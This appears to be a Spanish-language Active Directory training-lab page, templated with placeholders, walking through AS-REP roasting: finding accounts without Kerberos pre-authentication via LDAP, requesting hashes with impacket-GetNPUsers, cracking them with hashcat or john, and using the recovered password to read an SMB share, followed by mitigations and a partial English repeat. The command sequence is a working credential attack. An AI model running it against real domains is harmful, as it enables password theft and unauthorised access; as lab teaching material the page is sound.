Objetivo

Una cuenta de servicio tiene deshabilitada la pre-autenticación de Kerberos (DONT_REQ_PREAUTH). Solicita su AS-REP, crackea offline el hash krb5asrep y usa la contraseña recuperada para leer //DC01/backup.

Flag: //{{ ad_dc_host }}/backup/flag-ad-04.txt — captúrala en el Domain Controller y valídala en la barra lateral.

{% include 'labs/_ad_target.html' %}

Nota sobre este Domain Controller

El KDC embebido de Samba tiene una limitación conocida: no siempre completa en vivo el intercambio AS-REQ/AS-REP para cuentas con DONT_REQ_PREAUTH, aunque el atributo esté correctamente configurado (verificable por LDAP). Los comandos de impacket-GetNPUsers de abajo son exactamente los que usarías contra un Domain Controller Windows real. Para que el ejercicio de cracking sea idéntico al de una red real, el hash ya ha sido "capturado" y publicado en //{{ ad_dc_host }}/public/captured_asrep.txt — es un hash válido y crackeable generado con las mismas primitivas criptográficas de Kerberos.

Inicio rápido

# Descargar el hash "capturado" (o intentar el roast en vivo, ver guía)
smbclient -N //{{ ad_dc_ip }}/public -c 'get captured_asrep.txt'

# Crackear offline
hashcat -m 18200 captured_asrep.txt /usr/share/wordlists/rockyou.txt

1 · Por qué funciona

Con pre-autenticación activada, el cliente debe cifrar una marca de tiempo con su clave (derivada de la contraseña) antes de que el KDC responda. Si la cuenta tiene el flag DONT_REQ_PREAUTH, el KDC entrega el AS-REP a cualquiera que lo pida: ese mensaje va cifrado con la clave del usuario, así que es un hash crackeable offline.

2 · Localizar cuentas sin pre-autenticación

export DC={{ ad_dc_ip }}
export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'

# Filtro LDAP: bit 0x400000 de userAccountControl
ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" \
  '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' \
  sAMAccountName

Aparece svc.backup. El atributo está correctamente configurado en el directorio — puedes comprobarlo tú mismo con esta consulta.

3 · Solicitar el AS-REP (comando real, contra Windows funciona así)

impacket-GetNPUsers '{{ ad_realm_lower }}/svc.readonly:ReadOnly123!' \
  -dc-ip $DC -request -format hashcat -outputfile asrep.hash

cat asrep.hash
# $krb5asrep$23$svc.backup@{{ ad_realm }}:a1b2c3...$e4f5...

Nota sobre este laboratorio: el KDC de Samba AD DC no siempre entrega el AS-REP sin preautenticación en la práctica, aunque el atributo DONT_REQ_PREAUTH esté correctamente activado (limitación conocida de la implementación del KDC de Samba frente a un Domain Controller Windows real). Si el comando anterior no produce un hash, descarga el ya "capturado":

smbclient -N //$DC/public -c 'get captured_asrep.txt'
cat captured_asrep.txt
# $krb5asrep$23$svc.backup@{{ ad_realm }}:...

4 · Crackear el hash offline

# hashcat (modo 18200 = Kerberos 5 AS-REP etype 23)
hashcat -m 18200 captured_asrep.txt /usr/share/wordlists/rockyou.txt --force

# john
john --wordlist=/usr/share/wordlists/rockyou.txt captured_asrep.txt

La contraseña recuperada es Welcome1.

5 · Validar y capturar la flag

nxc smb $DC -u 'svc.backup' -p 'Welcome1' --shares

smbclient //$DC/backup -U '{{ ad_domain }}\svc.backup%Welcome1' -c 'get flag-ad-04.txt -'

Mitigación

  • No deshabilitar nunca la pre-autenticación de Kerberos; auditar el bit DONT_REQ_PREAUTH.
  • Contraseñas largas y aleatorias en cuentas de servicio (idealmente gMSA, rotación automática).
  • Alertar sobre eventos 4768 con tipo de cifrado RC4 y sin pre-autenticación.

Herramientas

impacket-GetNPUsers netexec (nxc) hashcat john Rubeus

1 · Why it works

With pre-authentication enabled the client must encrypt a timestamp with its key (derived from the password) before the KDC answers. If the account carries the DONT_REQ_PREAUTH flag, the KDC hands the AS-REP to anyone who asks: that message is encrypted with the user key, so it is an offline-crackable hash.

Mitigation
